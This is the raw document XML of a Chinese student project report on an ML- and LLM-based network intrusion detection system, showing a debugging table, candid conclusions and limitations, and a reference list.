              </w:rPr>
              <w:t>启动时 env -u ALL_PROXY -u all_proxy；探针对局域网中心设 trust_env=False；大模型层捕获后降级为模板报告</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="0D65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1213FB7F">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>XGBoost 训练直接报标签错误</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3061" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="2EE658D7">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>sklearn 接口只接受 0..K-1 的整数标签，predict() 返回的是下标</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2835" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="66FEB796">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>统一编码一次，预测结果过 artifact["classes"][pred] 还原类名</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="56FD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4CD4ED9E">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>切到告警标签页后约 9 秒被弹回第一个标签页</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3061" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="2638A577">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>告警页里调用了 st.rerun(scope="app")，整页重跑重置了标签选择</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2835" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="01BE6263">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>去掉该调用，改为写 session_state，由报告页按 10 秒自行刷新</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="15AF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15BD7203">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>追问的回答刚一出现就消失</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3061" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="36CF8EAC">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>报告页每 10 秒整块重渲，直接 st.success 的内容会被刷掉</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2835" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0DDBC7D6">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>回答按 report_id 存进 session_state，重渲后仍能取回</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="2575C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835" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="18E05B93">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>报告字段偶有缺失，模型输出不成结构</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3061" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="21145343">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>大模型自由发挥，风险等级不在枚举内或缺少证据链</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2835" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="77C0B6F4">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>用 Pydantic 强校验，字段缺失即拒绝落库并触发重试/降级</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w14:paraId="3089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vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="02384E0A">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>连续攻击流量下大模型调用次数与告警数成正比</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3061" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3D9365A4">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>中心对每条告警各排一次诊断任务，没有按类别或时间窗合并</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2835" w:type="dxa"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="26F1B126">
            <w:pPr>
              <w:spacing w:before="30" w:after="30" w:line="276" w:lineRule="auto"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
                <w:b w:val="0"/>
                <w:color w:val="000000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>已在文档中记为已知问题；演示前先做误报预筛。后续应改为按类别合并、并设单位时间调用上限</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="60603B98">
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1385CFC1">
      <w:pPr>
        <w:pStyle w:val="4"/>
        <w:pageBreakBefore w:val="0"/>
        <w:spacing w:before="240" w:after="120" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>3.8 结论与不足</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4726F105">
      <w:pPr>
        <w:pStyle w:val="5"/>
        <w:spacing w:before="160" w:after="80" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>3.8.1 做到了什么</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B51211E">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>第一，四层链路在一台机器上完整跑通：从会话特征上报，到小模型判定并落库告警，到规则引擎补充印证，到大模型生成五段式中文报告，到看板实时展示与追问，全部是真实调用而非示意。单份报告的中位耗时 4.97 秒、中位正文 1 122 字。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1342F990">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>第二，给出了同口径、可复现的量化证据：五模型在同一次前向滚动验证与同一段封存测试集上对比，XGBoost 的 reliable macro-F1 为 0.9719；同一个测试段上阈值规则基线为 0.5795；两列数字来自同一批 22 907 行、同一 macro 口径，可以直接相减。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72F3AA35">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>第三，文档里每一条结论都写清了它成立的条件，包括那些对我们不利的结论：混合森林没有超过单模型、按天留出在六类模型上不可用、线上手工构造的流量被判成 BENIGN 0.9999。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29ED5189">
      <w:pPr>
        <w:pStyle w:val="5"/>
        <w:spacing w:before="160" w:after="80" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>3.8.2 没做到的与不敢说的</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="249ABC08">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="480" w:hanging="240"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>（1）双探针联动（M10）未完成，只有设计没有联调，原因是第二台机器未到位。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06AF655C">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="480" w:hanging="240"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>（2）真实抓包没有在答辩机上跑通。本机没有 CAP_NET_RAW 权限，演示用的是数据集回放走真实接口，被替换的只是“帧从哪里来”这一环。这项应当在有权限的机器上补做。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="632DD9F5">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="480" w:hanging="240"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>（3）开集泛化没有解决，跨天留出实验是失败的。这是数据集的类别分布决定的（每类攻击只出现在某一天），不是调参能解决的事情，我们把它写成结论而不是掩盖。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2067D25A">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="480" w:hanging="240"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>（4）没有做消融定位混合森林在 DoS Hulk 上掉到 0.629 的成因，只记录了现象。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62124288">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="480" w:hanging="240"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>（5）大模型调用次数与告警数成正比，没有做合并与限流，连续攻击流量下会产生大量调用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72FA072C">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="480" w:hanging="240"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>（6）中心把推理与落库放在同一个进程里串行执行，没有消息队列缓冲，连续大流量下上报接口会被推理阻塞。两周周期内我们判断多一个中间件就多一个失效点，这个取舍在课程演示规模下成立，但不应被读成“已经够用”。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EE257CE">
      <w:pPr>
        <w:pStyle w:val="5"/>
        <w:spacing w:before="160" w:after="80" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>3.8.3 最重要的一条认识</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AEAA2F7">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>把在线提取器接到真实流量上、再回头核对数据集之后，我们得到的结论是：小模型学到的是这份数据集的判别边界，而不是这类攻击的判别边界。数据集自己的行没有问题——类内时间留出集上 PortScan 召回 0.998、DoS Hulk 0.913；但按数据集形态手工构造的一条 DoS Hulk 仍被判 BENIGN 0.9999，因为数据集里的流量是“长流慢速”（中位 84.9 秒、6 个包、0.16 包/秒），而我们现场构造的是“短流突发”（0.1 秒、200 个包、2 010 包/秒）。遇到没见过的形状时，小模型既不报警也不报错[16]。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EB074A8">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>这条认识直接决定了系统的三层分工：小模型负责在已知形态里给出类别与置信度，用于方法验证与演示；规则引擎负责线上兜底，判的是与采集口径无关的行为量；大模型负责解释前两层说不清的流量。这也解释了为什么不能用一个“准确率 0.97”来总结这个项目——那个数字描述的是数据集内部的一致性，不是系统的线上能力。把这条边界讲清楚，比把指标报得更高更能说明我们明白自己在做什么。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48ABA95C">
      <w:pPr>
        <w:pStyle w:val="5"/>
        <w:spacing w:before="160" w:after="80" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>3.8.4 后续工作</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00737034">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>按优先级排列：补做真实抓包与攻击复现的联动验证（需要 CAP_NET_RAW）；完成 M10 双探针演示；把大模型诊断改为按类别与时间窗合并、并加调用上限；尝试原始字节级的端到端检测（1D-CNN 直接读 pcap，绕过人工特征），这是让模型真正学会“攻击形态”而不是“数据集形态”的可行方向；把规则阈值改为可在线配置，减少每次调参都要重训重测的成本。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DC52A77">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:pageBreakBefore/>
        <w:spacing w:before="360" w:after="200" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>四、参考文献</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6512D34D">
      <w:pPr>
        <w:spacing w:before="0" w:after="40" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="480" w:hanging="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>[1] 谢希仁. 计算机网络（第 8 版）[M]. 北京: 电子工业出版社, 2022 年 1 月.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="675B0B8A">
      <w:pPr>
        <w:spacing w:before="0" w:after="40" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="480" w:hanging="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>[2] 袁华, 王昊翔, 黄敏. 深入理解计算机网络[M]. 北京: 清华大学出版社, 2024 年 5 月.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07827B39">
      <w:pPr>
        <w:spacing w:before="0" w:after="40" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="480" w:hanging="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>[3] 唐继勇, 龙兴旺. 计算机网络基础[M]. 北京: 人民邮电出版社, 2024 年 8 月.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43854EFA">
      <w:pPr>
        <w:spacing w:before="0" w:after="40" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="480" w:hanging="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>[4] IETF. RFC 793: Transmission Control Protocol[S]. 1981.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FE91ED0">
      <w:pPr>
        <w:spacing w:before="0" w:after="40" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="480" w:hanging="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>[5] IETF. RFC 5681: TCP Congestion Control[S]. 2009.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E078999">
      <w:pPr>
        <w:spacing w:before="0" w:after="40" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="480" w:hanging="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>[6] Sharafaldin I, Lashkari A H, Ghorbani A A. Toward Generating a New Intrusion Detection Dataset and Intrusion Traffic Characterization[C]//Proceedings of the 4th International Conference on Information Systems Security and Privacy (ICISSP). 2018: 108-116.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="687230BC">
      <w:pPr>
        <w:spacing w:before="0" w:after="40" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="480" w:hanging="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>[7] Lashkari A H, Draper-Gil G, Mamun M S I, et al. Characterization of Tor Traffic using Time based Features[C]//Proceedings of the 3rd International Conference on Information Systems Security and Privacy (ICISSP). 2017: 253-262.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FF13784">
      <w:pPr>
        <w:spacing w:before="0" w:after="40" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="480" w:hanging="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>[8] Breiman L. Random Forests[J]. Machine Learning, 2001, 45(1): 5-32.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56E2A6B8">
      <w:pPr>
        <w:spacing w:before="0" w:after="40" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="480" w:hanging="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>[9] Chen T, Guestrin C. XGBoost: A Scalable Tree Boosting System[C]//Proceedings of the 22nd ACM SIGKDD International Conference on Knowledge Discovery and Data Mining. 2016: 785-794.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E30B73C">
      <w:pPr>
        <w:spacing w:before="0" w:after="40" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="480" w:hanging="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>[10] Ke G, Meng Q, Finley T, et al. LightGBM: A Highly Efficient Gradient Boosting Decision Tree[C]//Advances in Neural Information Processing Systems (NeurIPS). 2017: 3146-3154.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0743B6A3">
      <w:pPr>
        <w:spacing w:before="0" w:after="40" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="480" w:hanging="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>[11] Prokhorenkova L, Gusev G, Vorobev A, et al. CatBoost: Unbiased Boosting with Categorical Features[C]//Advances in Neural Information Processing Systems (NeurIPS). 2018: 6638-6648.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B88A00C">
      <w:pPr>
        <w:spacing w:before="0" w:after="40" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="480" w:hanging="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>[12] Scapy 开发团队. Scapy 官方文档[EB/OL]. https://scapy.readthedocs.io/, 2024.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58CF975C">
      <w:pPr>
        <w:spacing w:before="0" w:after="40" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="480" w:hanging="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
